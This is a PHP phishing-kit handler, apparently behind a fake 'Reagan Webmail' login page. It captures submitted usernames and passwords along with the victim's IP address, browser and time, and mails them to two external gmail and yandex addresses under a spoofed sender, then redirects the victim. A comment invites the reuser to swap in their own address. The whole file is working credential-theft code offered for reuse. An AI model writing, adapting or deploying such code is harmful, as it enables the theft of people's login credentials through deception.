<?
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$message .= "[+]===============USERID-===============\n";
$message .= "[+]Email            : ".$_POST['user_name']."\n";
$message .= "[+]Password            : ".$_POST['password']."\n";
$message .= "[+]===============Reagan===============\n";
$message .= "[+]Client IP: ".$ip."\n";
$message .= "[+]Browser                :".$browserAgent."\n";
$message .= "[+]DateTime                    : ".$timedate."\n";
$message .= "[+]===============BY M.C===============\n";
$rnessage  = "$message\n";
//change ur email here
$send = "mastersraw006@gmail.com,matsont@yandex.ru";
$subject = "Reagan Webmail |$ip";
$headers = "From: Reagan <webmail@smartpage.com> ";
mail($send,$subject,$message,$headers);
Header ("Location: redirect.php");
?>